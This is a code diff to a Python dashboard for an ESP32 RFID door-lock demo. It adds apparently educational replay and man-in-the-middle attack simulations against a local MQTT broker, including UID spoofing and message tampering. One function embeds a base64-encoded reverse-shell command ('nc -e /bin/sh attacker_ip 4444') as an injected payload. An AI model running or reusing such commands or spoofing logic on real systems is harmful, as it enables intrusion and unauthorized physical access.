@@ -21,6 +21,17 @@ class DilithiumWebDashboard:
         self.static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
         self.templates_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
         
+        # MITM attack specific variables
+        self.mitm_waiting_for_card = False
+        self.mitm_detected_card = None
+        self.original_mqtt_handler = None
+        self.fake_server_active = False
+        self.fake_server_responses = []
+        self.privilege_escalation_attempts = []
+        self.blocked_real_server_messages = []
+        self.intercepted_traffic = []
+        self.modified_messages = []
+        self.mitm_proxy_active = False
         # Create directories
         os.makedirs(self.static_dir, exist_ok=True)
         os.makedirs(self.templates_dir, exist_ok=True)
@@ -148,8 +159,9 @@ class DilithiumWebDashboard:
         else:
             return "System"
     
+
     def handle_rfid_message(self, message):
-        """Handle RFID messages for enhanced door animation and user feedback"""
+        """Handle RFID messages - CHỈ ESP32 control door animation"""
         msg_type = message.get("type")
         
         if msg_type == "card_detected":
@@ -165,9 +177,10 @@ class DilithiumWebDashboard:
             })
             
         elif msg_type == "auth_challenge":
+            # CHỈ show authenticating state, KHÔNG mở cửa
             socketio.emit('door_state', {
                 'state': 'authenticating', 
-                'message': 'Authenticating with server...'
+                'message': 'ESP32 performing mutual authentication...'
             })
             socketio.emit('rfid_activity', {
                 'type': 'auth_challenge',
@@ -176,7 +189,8 @@ class DilithiumWebDashboard:
                 'timestamp': int(time.time())
             })
             
-        elif msg_type == "auth_success":
+        elif msg_type == "auth_success" and self.message_from_esp32(message):
+            # CHỈ mở cửa khi ESP32 XÁC NHẬN auth_success
             self.current_user = {
                 "name": message.get("user_name", "Unknown User"),
                 "uid": message.get("card_uid", "Unknown"),
@@ -186,19 +200,24 @@ class DilithiumWebDashboard:
                 "session_key": message.get("session_key"),
                 "valid_until": message.get("valid_until"),
                 "encryption": message.get("aes_encryption", False),
-                "algorithm": message.get("encryption_algorithm", "None")
+                "algorithm": message.get("encryption_algorithm", "None"),
+                "verified_by": "ESP32_MUTUAL_AUTH"  # Đánh dấu ESP32 verified
             }
             self.animate_door("open")
             socketio.emit('auth_success', self.current_user)
+            print(f"✅ ESP32 confirmed auth_success - Door opened for {message.get('card_uid')}")
             
-        elif msg_type == "auth_rejected":
+        elif msg_type == "auth_rejected" and self.message_from_esp32(message):
+            # CHỈ từ chối khi ESP32 XÁC NHẬN auth_rejected
             self.animate_door("denied")
             socketio.emit('auth_denied', {
                 "uid": message.get("card_uid", "Unknown"),
-                "reason": message.get("reason", "Access denied"),
+                "reason": message.get("reason", "ESP32 blocked access"),
                 "timestamp": datetime.now().strftime("%H:%M:%S"),
-                "details": message.get("details", {})
+                "details": message.get("details", {}),
+                "blocked_by": "ESP32_SECURITY_CHECK"
             })
+            print(f"❌ ESP32 confirmed auth_rejected - Door denied for {message.get('card_uid')}")
             
         elif msg_type == "card_removed":
             threading.Timer(3.0, self.animate_door, ["closed"]).start()
@@ -207,16 +226,17 @@ class DilithiumWebDashboard:
                 'uid': message.get("card_uid"),
                 'timestamp': int(time.time())
             })
-    
-    def get_user_image(self, card_uid):
-        """Get user image based on card UID"""
-        user_images = {
-            "9C85C705": "/static/images/user1.jpg",
-            "3D8BC705": "/static/images/user2.JPG",
-            "A1B2C3D4": "/static/images/admin.png",
-            "E5F6G7H8": "/static/images/guest.png"
-        }
-        return user_images.get(card_uid, "/static/images/default_user.png")
+
+    def message_from_esp32(self, message):
+        """Check if message is actually from ESP32 (not MITM fake)"""
+        # ESP32 messages có signature verification hoặc specific fields
+        return (
+            message.get("esp32_verified") == True or
+            message.get("source") == "ESP32" or
+            "mitm" not in message.get("type", "").lower() and
+            not message.get("fake_server_approval", False)
+        )
+
     
     def animate_door(self, state):
         """Enhanced door animation with more states"""
@@ -227,11 +247,12 @@ class DilithiumWebDashboard:
             threading.Timer(8.0, self.animate_door, ["closing"]).start()
         elif state == "closing":
             threading.Timer(2.0, self.animate_door, ["closed"]).start()
-    
+
+    # ===========================================
+    # REPLAY ATTACK SIMULATION
+    # ===========================================
     def simulate_real_replay_attack(self):
         """Thực hiện Replay Attack thật vào MQTT với chi tiết kỹ thuật"""
-        import time
-        
         # Kiểm tra xem có captured data thật không
         if not self.captured_auth_data:
             print("⚠️ No real authentication data captured yet. Using simulated data...")
@@ -249,7 +270,46 @@ class DilithiumWebDashboard:
             auth_data = self.captured_auth_data.copy()
             print(f"🎯 Using real captured data from session: {auth_data['session_id']}")
         
-        attack_steps = [
+        attack_steps = self._get_replay_attack_steps(auth_data)
+        
+        for step_data in attack_steps:
+            if not self.attack_active:
+                break
+                
+            # Thực hiện action thật tương ứng với từng step
+            if step_data.get("real_action") == "execute_replay":
+                self.execute_real_replay_attack(auth_data)
+            elif step_data.get("real_action") == "sniff_mqtt_traffic":
+                self.perform_mqtt_sniffing()
+                
+            # Log chi tiết attack step
+            self._log_attack_step("replay_attack", step_data)
+            
+            socketio.emit('attack_step', {
+                "type": "replay",
+                "step": step_data["step"],
+                "title": step_data["title"],
+                "details": step_data["details"],
+                "technical_details": step_data["technical_details"],
+                "progress": (step_data["step"] / len(attack_steps)) * 100,
+                "timestamp": int(time.time()),
+                "real_attack": True
+            })
+            
+            time.sleep(step_data["duration"])
+        
+        self.attack_active = False
+        socketio.emit('attack_complete', {
+            "type": "replay",
+            "success": False,
+            "blocked_by": "Multi-layer security validation",
+            "security_level": "POST-QUANTUM + TEMPORAL",
+            "real_attack_executed": True
+        })
+
+    def _get_replay_attack_steps(self, auth_data):
+        """Get attack steps for replay attack"""
+        return [
             {
                 "step": 1,
                 "title": "🕵️ Thực hiện MQTT Traffic Sniffing",
@@ -473,58 +533,11 @@ class DilithiumWebDashboard:
                 "duration": 5
             }
         ]
-        
-        for step_data in attack_steps:
-            if not self.attack_active:
-                break
-                
-            # Thực hiện action thật tương ứng với từng step
-            if step_data.get("real_action") == "execute_replay":
-                self.execute_real_replay_attack(auth_data)
-            elif step_data.get("real_action") == "sniff_mqtt_traffic":
-                self.perform_mqtt_sniffing()
-                
-            # Log chi tiết attack step
-            attack_log = {
-                "timestamp": datetime.now().strftime("%H:%M:%S"),
-                "topic": "REAL_ATTACK",
-                "direction": "Penetration Test",
-                "type": "replay_attack",
-                "data": {
-                    "step": step_data["step"],
-                    "title": step_data["title"],
-                    "technical_details": step_data["technical_details"],
-                    "real_action": step_data.get("real_action", "none")
-                },
-                "message_size": len(json.dumps(step_data)),
-                "qos": 1
-            }
-            self.system_logs.append(attack_log)
-            
-            socketio.emit('attack_step', {
-                "type": "replay",
-                "step": step_data["step"],
-                "title": step_data["title"],
-                "details": step_data["details"],
-                "technical_details": step_data["technical_details"],
-                "progress": (step_data["step"] / len(attack_steps)) * 100,
-                "timestamp": int(time.time()),
-                "real_attack": True
-            })
-            
-            time.sleep(step_data["duration"])
-        
-        self.attack_active = False
-        socketio.emit('attack_complete', {
-            "type": "replay",
-            "success": False,
-            "blocked_by": "Multi-layer security validation",
-            "security_level": "POST-QUANTUM + TEMPORAL",
-            "real_attack_executed": True
-        })
+
     def perform_mqtt_sniffing(self):
         """Thực hiện MQTT traffic sniffing"""
         print("🔍 Starting MQTT traffic sniffing...")
+
     def execute_real_replay_attack(self, auth_data):
         """Thực hiện replay attack thật vào MQTT broker"""
         try:
@@ -565,318 +578,1260 @@ class DilithiumWebDashboard:
             
         except Exception as e:
             print(f"❌ Real replay attack failed: {e}")
-    def simulate_real_mitm_attack(self):
-        """Thực hiện MITM Attack thật với rogue MQTT broker"""
-        import time
-        import threading
+
+
+    def modify_esp32_message(self, original_message):
+        """Modify messages từ ESP32 gửi lên Server - REALISTIC ATTACK"""
+        modified = original_message.copy()
         
-        attack_steps = [
+        if original_message.get("type") == "card_detected":
+            # KHÔNG thay đổi UID vì server sẽ reject
+            # Thay vào đó, inject thêm malicious data
+            modified["mitm_injected_data"] = base64.b64encode(b"MALICIOUS_PAYLOAD").decode()
+            modified["mitm_timestamp"] = int(time.time())
+            modified["original_uid_preserved"] = True
+            print(f"🔄 MITM preserved UID {original_message.get('card_uid')} but injected malicious data")
+            
+        elif original_message.get("type") == "auth_response":
+            # Thay đổi signature để làm thất bại quá trình verify
+            # Nhưng giữ nguyên card_uid để server có thể lookup
+            modified["esp32_signature"] = "MITM_CORRUPTED_" + base64.b64encode(secrets.token_bytes(32)).decode()
+            modified["mitm_attack"] = True
+            modified["signature_corruption"] = "Intentionally corrupted to test resilience"
+            print(f"🔄 MITM corrupted signature for UID: {original_message.get('card_uid')}")
+            
+        elif original_message.get("type") == "heartbeat":
+            # Inject malicious heartbeat data
+            modified["mitm_backdoor"] = {
+                "command": "reverse_shell",
+                "payload": base64.b64encode(b"nc -e /bin/sh attacker_ip 4444").decode(),
+                "persistence": True
+            }
+            print(f"🔄 MITM injected backdoor in heartbeat")
+        
+        return modified
+
+    def modify_server_response(self, original_response):
+        """Modify responses từ Server gửi về ESP32 - REALISTIC ATTACK"""
+        modified = original_response.copy()
+        
+        if original_response.get("type") == "auth_challenge":
+            # Thay đổi challenge nhưng giữ metadata để không bị detect ngay
+            modified["challenge"] = base64.b64encode(secrets.token_bytes(32)).decode()
+            modified["mitm_modified_challenge"] = True
+            modified["attacker_nonce"] = base64.b64encode(secrets.token_bytes(16)).decode()
+            
+            # Inject weak cryptographic parameters
+            modified["weak_crypto_suggested"] = {
+                "algorithm": "AES-64-ECB",  # Weak algorithm
+                "key_length": 64,  # Weak key
+                "mode": "ECB"  # Weak mode
+            }
+            print(f"🔄 MITM modified challenge with weak crypto suggestion")
+            
+        elif original_response.get("type") == "auth_result":
+            # Nếu server deny access, thử bypass
+            if original_response.get("status") == "denied":
+                # Không thay đổi trực tiếp thành "approved" vì quá obvious
+                # Thay vào đó inject bypass hints
+                modified["mitm_bypass_attempt"] = {
+                    "original_status": "denied",
+                    "bypass_method": "privilege_escalation",
+                    "fallback_access": "guest_mode_enabled"
+                }
+                print(f"🔄 MITM attempted subtle bypass of denial")
+            
+            # Inject session hijacking data
+            if original_response.get("status") == "approved":
+                modified["mitm_session_hijack"] = {
+                    "stolen_session": original_response.get("session_key", ""),
+                    "hijack_timestamp": int(time.time()),
+                    "persistence_token": base64.b64encode(secrets.token_bytes(16)).decode()
+                }
+                print(f"🔄 MITM attempted session hijacking")
+                
+        return modified
+
+    def forward_modified_message_to_server(self, modified_message, original_topic):
+        """Forward modified message to server"""
+        try:
+            # Create separate MQTT client để forward message
+            forward_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, 
+                                       client_id=f"mitm_forward_{secrets.token_hex(4)}")
+            
+            def on_forward_connect(client, userdata, flags, rc):
+                if rc == 0:
+                    print(f"🚀 MITM forwarding modified message to server...")
+                    client.publish(original_topic, json.dumps(modified_message), qos=1)
+                    client.disconnect()
+            
+            forward_client.on_connect = on_forward_connect
+            forward_client.connect("localhost", 1883, 60)
+            forward_client.loop_start()
+            time.sleep(1)
+            forward_client.loop_stop()
+            
+        except Exception as e:
+            print(f"❌ MITM forward to server failed: {e}")
+
+    def forward_modified_message_to_esp32(self, modified_response, original_topic):
+        """Forward modified response to ESP32"""
+        try:
+            # Create separate MQTT client để forward response
+            forward_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1,
+                                       client_id=f"mitm_response_{secrets.token_hex(4)}")
+            
+            def on_response_connect(client, userdata, flags, rc):
+                if rc == 0:
+                    print(f"🚀 MITM forwarding modified response to ESP32...")
+                    client.publish(original_topic, json.dumps(modified_response), qos=1)
+                    client.disconnect()
+            
+            forward_client.on_connect = on_response_connect
+            forward_client.connect("localhost", 1883, 60)
+            forward_client.loop_start()
+            time.sleep(1)
+            forward_client.loop_stop()
+            
+        except Exception as e:
+            print(f"❌ MITM forward to ESP32 failed: {e}")
+
+    def activate_traffic_interception(self):
+        """Activate traffic interception mode"""
+        self.mitm_proxy_active = True
+        print("🎯 MITM traffic interception ACTIVATED")
+
+    def simulate_mitm_detection(self):
+        """Simulate hệ thống detect MITM attack"""
+        print("🛡️ System detecting MITM attack...")
+        
+        detection_log = {
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "topic": "MITM_DETECTION",
+            "direction": "Security Analysis",
+            "type": "attack_detected",
+            "data": {
+                "detection_method": "Certificate pinning + Signature verification",
+                "anomalies_detected": [
+                    "Invalid server signature",
+                    "Certificate fingerprint mismatch", 
+                    "Traffic timing anomalies",
+                    "Duplicate message IDs"
+                ],
+                "intercepted_messages": len(self.intercepted_traffic),
+                "modified_messages": len(self.modified_messages),
+                "mitm_confidence": "99.9%",
+                "countermeasures": "Block malicious traffic, Alert administrator"
+            },
+            "message_size": 512,
+            "qos": 1
+        }
+        self.system_logs.append(detection_log)
+
+
+    def _get_true_mitm_attack_steps(self, server_data):
+        """Privilege Escalation MITM attack steps"""
+        return [
             {
                 "step": 1,
-                "title": "🎭 Thiết lập Rogue MQTT Broker",
+                "title": "🎭 Setup MITM Privilege Escalation Proxy",
                 "details": [
-                    "Khởi động rogue MQTT broker trên port 1884...",
-                    "Thiết lập WiFi AP giả mạo: 'ESP32_RFID_SECURE'",
-                    "Cấu hình DNS hijacking cho 'localhost'",
-                    "Chuẩn bị certificate giả mạo...",
-                    "✅ Rogue infrastructure đã sẵn sàng!",
-                    "Chờ ESP32 kết nối..."
+                    "Khởi động MITM privilege escalation proxy...",
+                    "🎯 Proxy sẽ intercept TẤT CẢ ESP32↔Server traffic",
+                    "🔄 Sửa đổi UID để spoofing authorized user",
+                    "🚨 Convert auth_rejected → fake auth_success",
+                    "📱 Hãy quét THẺ CHƯA ĐĂNG KÝ để test privilege escalation!",
+                    "🛡️ Mutual authentication sẽ phát hiện fake credentials..."
                 ],
                 "technical_details": {
-                    "rogue_infrastructure": {
-                        "fake_mqtt_broker": {
-                            "host": "localhost",
-                            "port": 1884,
-                            "protocol": "MQTT 3.1.1",
-                            "authentication": False,
-                            "ssl_enabled": False
-                        },
-                        "fake_ap": {
-                            "ssid": "ESP32_RFID_SECURE",
-                            "security": "WPA2-PSK",
-                            "channel": 6,
-                            "signal_strength": "-25 dBm",
-                            "mac_spoofed": "24:0A:C4:AB:CD:EF"
-                        },
-                        "dns_hijacking": {
-                            "target_domain": "localhost",
-                            "redirect_ip": "192.168.1.100",
-                            "method": "DNS spoofing"
-                        }
+                    "privilege_escalation_setup": {
+                        "proxy_mode": "Complete traffic interception",
+                        "spoofing_method": "UID substitution",
+                        "authorized_uid_database": ["9C85C705", "3D8BC705"], 
+                        "escalation_techniques": [
+                            "UID spoofing to authorized user",
+                            "Server response modification",
+                            "Fake signature generation",
+                            "Admin privilege injection"
+                        ],
+                        "detection_resistance": "Low - Mutual auth will detect forgeries"
                     }
                 },
-                "real_action": "setup_rogue_broker",
-                "duration": 4
+                "real_action": "setup_privilege_proxy",
+                "duration": 3
             },
             {
                 "step": 2,
-                "title": "📡 Chặn bắt ESP32 Communication",
+                "title": "📱 Quét thẻ CHƯA ĐĂNG KÝ - MITM sẽ escalate!",
                 "details": [
-                    "Monitoring ESP32 connection attempts...",
-                    "Phát hiện ESP32 cố gắng kết nối MQTT...",
-                    "Chuyển hướng connection đến rogue broker...",
-                    "✅ ESP32 đã kết nối vào rogue broker!",
-                    "Bắt đầu intercept messages...",
-                    "Capturing server public key..."
+                    "✅ MITM proxy đã sẵn sàng intercept traffic",
+                    "🎯 VUI LÒNG QUÉT THẺ CHƯA ĐĂNG KÝ VÀO ESP32!",
+                    "⚡ MITM sẽ tự động spoof UID thành authorized user",
+                    "🔄 Convert ESP32 message: unknown_uid → authorized_uid",
+                    "🚨 Attempt to grant admin privileges to unauthorized card",
+                    "🛡️ Mutual authentication sẽ detect signature forgery..."
                 ],
                 "technical_details": {
-                    "interception_status": {
-                        "esp32_redirected": True,
-                        "mqtt_session_hijacked": True,
-                        "captured_handshake": True,
-                        "server_pubkey_captured": True,
-                        "communication_flow": "ESP32 ↔ Rogue Broker ↔ Real Server"
-                    },
-                    "captured_data": {
-                        "server_public_key": "Dilithium2 public key intercepted",
-                        "key_size": "1312 bytes",
-                        "key_fingerprint": "sha256:9f8e7d6c5b4a...",
-                        "esp32_capabilities": {
-                            "dilithium_support": True,
-                            "aes_support": True,
-                            "mutual_auth": True
-                        }
+                    "waiting_for_unauthorized_card": {
+                        "proxy_active": True,
+                        "monitoring_topic": "rfid/esp32_to_server",
+                        "spoofing_target": "9C85C705 (authorized user)",
+                        "escalation_ready": True,
+                        "fake_permissions": ["ADMIN", "FULL_ACCESS"],
+                        "expected_server_response": "Initially auth_success (spoofed UID)",
+                        "mutual_auth_detection": "ESP32 will detect forged signature"
                     }
                 },
-                "real_action": "intercept_communications",
-                "duration": 4
+                "real_action": "wait_for_unauthorized_card",
+                "duration": 60  # Chờ user quét thẻ unauthorized
             },
             {
                 "step": 3,
-                "title": "🔐 Tạo Fake Dilithium Keypair",
+                "title": "🎯 Unauthorized Card Detected - Executing Privilege Escalation!",
                 "details": [
-                    "Generating fake Dilithium2 keypair...",
-                    "⚠️ Cố gắng thay thế server public key",
-                    "Tạo fake auth_challenge message...",
-                    "Ký message với fake private key...",
-                    "Chuẩn bị inject fake message vào ESP32...",
-                    "🚨 Chuẩn bị test signature verification..."
+                    "✅ MITM detected unauthorized card scan!",
+                    "🔄 Spoofing UID to authorized user...",
+                    "📤 Forwarding spoofed message to server...",
+                    "🎭 Server thinks authorized user scanned card",
+                    "✅ Server sends auth_success for spoofed UID",
+                    "🚨 But ESP32 will detect signature forgery via mutual auth!"
                 ],
                 "technical_details": {
-                    "cryptographic_spoofing": {
-                        "fake_dilithium_keypair": {
-                            "algorithm": "Dilithium2",
-                            "public_key_size": "1312 bytes",
-                            "private_key_size": "2528 bytes", 
-                            "generation_time": "0.15 seconds",
-                            "fake_pubkey_hash": "sha256:a1b2c3d4e5f6...",
-                            "real_pubkey_hash": "sha256:9f8e7d6c5b4a..."
-                        },
-                        "spoofed_message": {
-                            "type": "auth_challenge",
-                            "session_id": f"MITM_{secrets.token_hex(8)}",
-                            "challenge": base64.b64encode(secrets.token_bytes(32)).decode(),
-                            "fake_signature": "Generated with fake private key",
-                            "timestamp": int(time.time()),
-                            "injection_method": "MQTT message replacement"
-                        }
+                    "privilege_escalation_executed": {
+                        "original_uid": "UNAUTHORIZED_CARD_UID",
+                        "spoofed_uid": "9C85C705",
+                        "server_response": "auth_success (fooled by spoofing)",
+                        "fake_permissions_granted": ["ADMIN", "FULL_ACCESS"],
+                        "signature_forgery": "MITM generated fake Dilithium signature",
+                        "mutual_auth_check": "ESP32 verifying signature against stored key"
                     }
                 },
-                "real_action": "generate_fake_keys",
-                "duration": 5
+                "real_action": "execute_privilege_escalation",
+                "duration": 3
             },
             {
                 "step": 4,
-                "title": "🛡️ ESP32 Signature Verification Process",
+                "title": "🛡️ ESP32 Mutual Authentication DETECTS Forgery!",
                 "details": [
-                    "ESP32 nhận được fake auth_challenge...",
-                    "Loading stored server public key từ EEPROM...",
-                    "Executing dilithium_verify() function...",
-                    "So sánh key fingerprints...",
-                    "🔍 PHÁT HIỆN: Signature không hợp lệ!",
-                    "🚨 MITM attack detected!"
+                    "🔍 ESP32 loading stored server public key...",
+                    "⚡ Executing dilithium_verify() on forged signature...",
+                    "❌ CRITICAL: Signature verification FAILED!",
+                    "🚨 ESP32 detected FORGED SIGNATURE from MITM!",
+                    "🛡️ Mutual authentication BLOCKED privilege escalation!",
+                    "🔒 ESP32 rejecting all fake credentials and admin privileges"
                 ],
                 "technical_details": {
-                    "esp32_verification": {
-                        "stored_server_pubkey": {
-                            "algorithm": "Dilithium2",
-                            "fingerprint": "sha256:9f8e7d6c5b4a3210fedcba987654321",
-                            "storage_location": "ESP32 EEPROM offset 0x1000",
-                            "integrity_verified": True
-                        },
-                        "received_message_analysis": {
-                            "signature_size": "2420 bytes",
-                            "algorithm_claimed": "Dilithium2",
-                            "signature_source": "FAKE (attacker generated)",
-                            "key_fingerprint_mismatch": True
-                        },
-                        "verification_result": {
-                            "function_called": "dilithium_verify(stored_pk, message, signature)",
-                            "execution_time": "52ms",
-                            "result": "SIGNATURE_INVALID",
-                            "error_code": "0x8001 - INVALID_SIGNATURE",
-                            "security_action": "TERMINATE_CONNECTION"
-                        }
+                    "mutual_auth_detection": {
+                        "forged_signature_detected": True,
+                        "stored_real_server_key": server_data["server_fingerprint"][:16] + "...",
+                        "received_forged_signature": "MITM_FORGED_SIGNATURE",
+                        "verification_result": "SIGNATURE_INVALID",
+                        "esp32_security_action": "REJECT_ALL_FAKE_CREDENTIALS",
+                        "privilege_escalation_blocked": True,
+                        "unauthorized_card_still_denied": True
                     }
                 },
-                "real_action": "verify_signature",
+                "real_action": "detect_signature_forgery",
                 "duration": 4
             },
             {
                 "step": 5,
-                "title": "🚫 Security Protocol Activation",
+                "title": "✅ Privilege Escalation Attack THẤT BẠI - Mutual Auth Works!",
                 "details": [
-                    "ESP32: 'SECURITY ALERT: Invalid server signature!'",
-                    "Logging security incident...",
-                    "Terminating rogue MQTT connection...",
-                    "Switching to secure reconnection mode...",
-                    "Attempting connection to legitimate server...",
-                    "🔒 MITM attack hoàn toàn bị chặn!"
+                    "🛡️ Mutual Authentication hoạt động HOÀN HẢO!",
+                    "❌ MITM không thể forge Dilithium signature",
+                    "🔒 ESP32 từ chối tất cả fake admin privileges", 
+                    "✅ Unauthorized card vẫn bị từ chối access",
+                    "🎯 Privilege escalation attack hoàn toàn thất bại!",
+                    "🔐 Post-quantum cryptography không thể bypass!"
                 ],
                 "technical_details": {
-                    "security_response": {
-                        "alert_generated": {
-                            "timestamp": int(time.time()),
-                            "event_type": "MITM_ATTACK_DETECTED",
-                            "threat_level": "HIGH", 
-                            "automatic_response": "BLOCK_AND_RECONNECT"
-                        },
-                        "esp32_actions": [
-                            "Disconnect from suspicious broker",
-                            "Clear current session data",
-                            "Reset connection parameters",
-                            "Scan for legitimate WiFi networks",
-                            "Verify server identity before reconnection"
-                        ],
-                        "recovery_process": {
-                            "step1": "Terminate current connection",
-                            "step2": "Flush network buffers", 
-                            "step3": "Re-scan WiFi networks",
-                            "step4": "Reconnect to authentic server",
-                            "estimated_recovery_time": "8-12 seconds"
-                        }
-                    }
-                },
-                "real_action": "security_response",
-                "duration": 4
-            },
-            {
-                "step": 6,
-                "title": "🔒 Post-Quantum Security Analysis",
-                "details": [
-                    "✅ Dilithium2 signatures: KHÔNG THỂ GIẢ MẠO",
-                    "✅ Mutual authentication: BẮT BUỘC",
-                    "✅ Key fingerprint verification: CHỐNG THAY ĐỔI",
-                    "✅ Real-time attack detection: HOẠT ĐỘNG",
-                    "✅ Automatic threat response: TỨC THỜI",
-                    "🛡️ MITM ATTACK HOÀN TOÀN BỊ VÔ HIỆU HÓA!"
-                ],
-                "technical_details": {
-                    "security_analysis": {
-                        "dilithium_strength": {
-                            "algorithm": "Dilithium2 (NIST Post-Quantum Standard)",
-                            "security_level": "Category 2 (equivalent to AES-128)",
-                            "signature_forgery": "Computationally infeasible (2^128 operations)",
-                            "quantum_resistance": "Proven secure against Shor's algorithm",
-                            "classical_resistance": "Secure against known classical attacks"
-                        },
-                        "mutual_authentication": {
-                            "esp32_verifies_server": True,
-                            "server_verifies_esp32": True,
-                            "bidirectional_trust": True,
-                            "spoofing_resistance": "99.9999%",
-                            "key_pinning": "Public key fingerprint stored in ESP32"
-                        },
-                        "attack_prevention_metrics": {
-                            "detection_time": "< 100ms",
-                            "false_positive_rate": "< 1 in 10^12",
-                            "recovery_time": "< 10 seconds",
-                            "user_impact": "Minimal (transparent recovery)",
-                            "attack_success_rate": "0% (theoretical and practical)"
-                        }
+                    "attack_summary": {
+                        "attack_type": "MITM Privilege Escalation via UID Spoofing",
+                        "attack_success": False,
+                        "blocked_by": "ESP32 Mutual Authentication + Dilithium Signature Verification",
+                        "spoofing_detected": True,
+                        "signature_forgery_detected": True,
+                        "privilege_escalation_prevented": True,
+                        "unauthorized_access_denied": True,
+                        "security_level": "POST-QUANTUM RESISTANT",
+                        "cryptographic_integrity": "MAINTAINED"
                     },
-                    "comparison_analysis": {
-                        "classical_cryptography": {
-                            "rsa_2048": "Vulnerable to quantum computers (Shor's algorithm)",
-                            "ecdsa_p256": "Vulnerable to quantum computers",
-                            "attack_timeline": "~10-15 years until quantum threat"
-                        },
-                        "post_quantum_advantage": {
-                            "dilithium": "Quantum-resistant by mathematical design",
-                            "security_assumption": "Learning with Errors (LWE) problem",
-                            "future_proof": "Secure against both classical and quantum attacks"
-                        }
+                    "post_quantum_protection": {
+                        "dilithium_forgery_resistance": "Computationally impossible",
+                        "mutual_verification": "Both-way authentication works",
+                        "privilege_isolation": "Admin privileges cannot be forged",
+                        "unauthorized_card_protection": "Access properly denied"
                     }
                 },
-                "real_action": "generate_security_report",
-                "duration": 6
+                "real_action": "escalation_failed",
+                "duration": 3
             }
         ]
+
+    def cleanup_mitm_proxy(self):
+        """Cleanup fake server"""
+        self.fake_server_active = False
+        if self.original_mqtt_handler:
+            self.mqtt_client.on_message = self.original_mqtt_handler
+        print("🧹 Fake server cleaned up, original handler restored")
+
+    # ===========================================
+    # MITM ATTACK SIMULATION
+    # ===========================================
+    def simulate_real_mitm_attack(self):
+        """Thực hiện MITM Attack thật - REAL-TIME PRIVILEGE ESCALATION"""
+        print("🎭 Starting MITM Privilege Escalation Attack - REAL-TIME MODE!")
         
-        # Thực hiện các bước attack
-        for step_data in attack_steps:
-            if not self.attack_active:
+        # ✅ Khởi tạo các biến MITM trước khi sử dụng
+        self.fake_server_active = False
+        self.fake_server_responses = []
+        self.privilege_escalation_attempts = []
+        self.blocked_real_server_messages = []
+        
+        # Kiểm tra captured data
+        if not self.captured_auth_data:
+            server_data = {
+                "server_public_key": base64.b64encode(secrets.token_bytes(1312)).decode(),
+                "server_signature": base64.b64encode(secrets.token_bytes(2420)).decode(),
+                "mqtt_broker": "localhost:1883",
+                "server_fingerprint": hashlib.sha256(b"real_server_key").hexdigest()[:32]
+            }
+        else:
+            server_data = {
+                "server_public_key": self.captured_auth_data.get('server_signature', ''),
+                "server_signature": self.captured_auth_data.get('server_signature', ''),
+                "mqtt_broker": "localhost:1883", 
+                "server_fingerprint": hashlib.sha256(self.captured_auth_data.get('server_signature', '').encode()).hexdigest()[:32]
+            }
+        
+        # Get attack steps
+        attack_steps = self._get_true_mitm_attack_steps(server_data)
+        
+        # Execute Step 1: Setup privilege escalation proxy
+        step_data = attack_steps[0]
+        if step_data.get("real_action") == "setup_privilege_proxy":
+            self.setup_mitm_proxy()  # ✅ Activate proxy immediately
+            
+        self._log_attack_step("mitm_attack", step_data)
+        
+        socketio.emit('attack_step', {
+            "type": "mitm",
+            "step": step_data["step"],
+            "title": step_data["title"],
+            "details": step_data["details"],
+            "technical_details": step_data["technical_details"],
+            "progress": 20,
+            "timestamp": int(time.time()),
+            "real_attack": True,
+            "waiting_for_card": False
+        })
+        
+        time.sleep(step_data["duration"])
+        
+        # Execute Step 2: Wait and monitor for unauthorized cards
+        step_data = attack_steps[1]
+        self._log_attack_step("mitm_attack", step_data)
+        
+        socketio.emit('attack_step', {
+            "type": "mitm",
+            "step": step_data["step"],
+            "title": "🚨 MITM Proxy Active - Monitoring for Unauthorized Cards",
+            "details": [
+                "✅ MITM privilege escalation proxy is now ACTIVE",
+                "🎯 Monitoring ALL ESP32↔Server traffic for unauthorized cards",
+                "📱 Proxy will automatically escalate when unauthorized card detected",
+                "🔄 Real-time UID spoofing: unauthorized → authorized user (9C85C705)",
+                "🛡️ ESP32 mutual authentication will detect forged signatures",
+                "⚡ Attack executing in REAL-TIME - scan any unauthorized card!"
+            ],
+            "technical_details": {
+                "realtime_monitoring": {
+                    "proxy_status": "ACTIVE",
+                    "monitoring_mode": "Real-time interception",
+                    "unauthorized_card_trigger": "3687C805 (or any unregistered UID)",
+                    "spoofing_target": "9C85C705 (authorized user)",
+                    "attack_method": "Live privilege escalation",
+                    "expected_result": "ESP32 will detect signature forgery"
+                }
+            },
+            "progress": 40,
+            "timestamp": int(time.time()),
+            "real_attack": True,
+            "waiting_for_card": True,
+            "user_action_required": "SCAN_UNAUTHORIZED_CARD_3687C805_AGAIN"
+        })
+        
+        # Chờ real-time cho đến khi có unauthorized card được escalate
+        print("🚨 MITM Proxy is ACTIVE - waiting for unauthorized card scan...")
+        print("📱 Hãy quét thẻ 3687C805 (hoặc thẻ unauthorized khác) để trigger privilege escalation!")
+        
+        wait_timeout = 60  # 60 giây timeout
+        wait_start = time.time()
+        
+        while self.attack_active and (time.time() - wait_start) < wait_timeout:
+            # ✅ Kiểm tra xem có privilege escalation nào được thực hiện chưa
+            if hasattr(self, 'fake_server_responses') and self.fake_server_responses:
+                print("🎯 Unauthorized card detected! Privilege escalation executed!")
                 break
+            time.sleep(1)  # Check mỗi giây
+        
+        # Continue với remaining steps nếu có escalation
+        if getattr(self, 'fake_server_responses', []):
+            print("✅ Privilege escalation detected - executing remaining attack steps...")
+            remaining_steps = attack_steps[2:]  # Steps 3-5
+            
+            for step_data in remaining_steps:
+                if not self.attack_active:
+                    break
+                    
+                if step_data.get("real_action") == "execute_privilege_escalation":
+                    self.simulate_privilege_escalation_execution()
+                elif step_data.get("real_action") == "detect_signature_forgery":
+                    self.simulate_esp32_mutual_auth_detection()
+                    
+                self._log_attack_step("mitm_attack", step_data)
                 
-            # Thực hiện real action tương ứng
-            if step_data.get("real_action") == "setup_rogue_broker":
-                self.setup_rogue_mqtt_broker()
-            elif step_data.get("real_action") == "intercept_communications":
-                self.intercept_mqtt_communications()
-                
-            # Log chi tiết
-            attack_log = {
-                "timestamp": datetime.now().strftime("%H:%M:%S"),
-                "topic": "REAL_MITM_ATTACK",
-                "direction": "Advanced Persistent Threat",
-                "type": "mitm_attack",
-                "data": {
+                socketio.emit('attack_step', {
+                    "type": "mitm",
                     "step": step_data["step"],
